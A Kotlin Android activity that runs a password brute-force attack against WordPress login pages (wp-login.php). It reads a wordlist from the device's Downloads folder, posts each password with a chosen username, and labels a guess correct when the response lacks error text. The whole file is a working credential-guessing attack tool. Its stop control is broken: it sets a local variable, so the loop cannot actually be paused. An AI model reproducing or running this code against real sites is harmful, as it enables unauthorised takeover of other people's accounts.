package com.tg.tools

import android.graphics.Color
import android.os.Bundle
import android.os.Environment
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.View.*
import android.view.ViewGroup
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import org.jsoup.Connection
import org.jsoup.Jsoup
import org.jsoup.nodes.Document
import java.io.File
import java.io.FileNotFoundException
import kotlin.concurrent.thread

class LoggingFile : AppCompatActivity() {
    val stopTh = false
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_logging_file)
        val scroll = findViewById<ScrollView>(R.id.scrollView2)
        val tvFail = findViewById<TextView>(R.id.textView13)
        scroll.visibility = INVISIBLE
        tvFail.visibility = INVISIBLE
        raiseErrors()
    }

    private fun raiseErrors() {
        val fileName = intent.getStringExtra("name").toString()
        val login = intent.getStringExtra("login").toString()
        val url = intent.getStringExtra("url").toString()
        val tvFail = findViewById<TextView>(R.id.textView13)
        if (("wp-login.php" in url) and ("https" in url)) {
            try {
                thread {
                    val res: Connection.Response = Jsoup
                        .connect(url)
                        .data("log", login)
                        .data("pwd", "1")
                        .method(Connection.Method.POST)
                        .userAgent("Mozilla")
                        .execute()
                    val respCode = res.statusCode()
                    if (respCode == 200) {
                        runOnUiThread {
                            try {
                                val passwords = File(
                                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                                    fileName
                                )
                                    .readText(Charsets.UTF_8)
                                brute(passwords, url, login)
                            } catch (e: FileNotFoundException) {
                                tvFail.text = "File not found..."
                                tvFail.visibility = VISIBLE
                                println(e.stackTraceToString())
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                tvFail.text = "URL is invalid..."
                tvFail.visibility = VISIBLE

            }
        } else {
            tvFail.text = "URL is invalid..."
            tvFail.visibility = VISIBLE
        }
    }

    private fun brute(passwords: String, url: String, login: String) {
        val scroll = findViewById<ScrollView>(R.id.scrollView2)
        val tvFail = findViewById<TextView>(R.id.textView13)
        tvFail.text = "Url         " + url.replace("www.", "") + "\n" + "Login    " + login
        tvFail.textAlignment = TEXT_ALIGNMENT_VIEW_START
        tvFail.gravity = Gravity.LEFT
        tvFail.visibility = VISIBLE
        scroll.visibility = VISIBLE
        thread {
            for (password in passwords.split("\n")) {
                if (!stopTh) {
                    if (password != "") {
                        val res: Connection.Response = Jsoup
                            .connect(url)
                            .data("log", login)
                            .data("pwd", password)
                            .method(Connection.Method.POST)
                            .userAgent("Mozilla")
                            .execute()
                        val doc: Document = res.parse()
                        if (("Unknown" in doc.text()) or ("incorrect" in doc.text()) or ("ERROR" in doc.text()) or ("error" in doc.text())) {
                            runOnUiThread {
                                Log.i("Stop", "stop = $stopTh")
                                addInfo("   Passw: $password", true)
                            }
                        } else {
                            runOnUiThread {
                                Log.i("Stop", "stop = $stopTh")
                                addInfo("   Passw: $password", false)
                            }
                        }
                    }
                } else {
                    while (true){
                        if (!stopTh){
                            break
                        }
                    }
                }
            }
        }
    }

    fun back(view: View) {
        finish()
    }

    fun stopOrResume(view: View) {
        StopThread()
    }
    fun StopThread() {
        val stopTh = true
    }

    fun addInfo(str: String, validPassword: Boolean) {
        val scroll = findViewById<LinearLayout>(R.id.lay1)
        var txt = TextView(this)
        txt.layoutParams = ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )
        if (validPassword) {
            txt.text = "$str <- Incorrect"
            txt.setTextColor(Color.rgb(255, 255, 255))
        } else {
            txt.text = "$str <- Correct"
            txt.setTextColor(Color.rgb(255, 255, 255))
        }
        txt.textSize = 20F
        scroll.addView(txt)
    }
}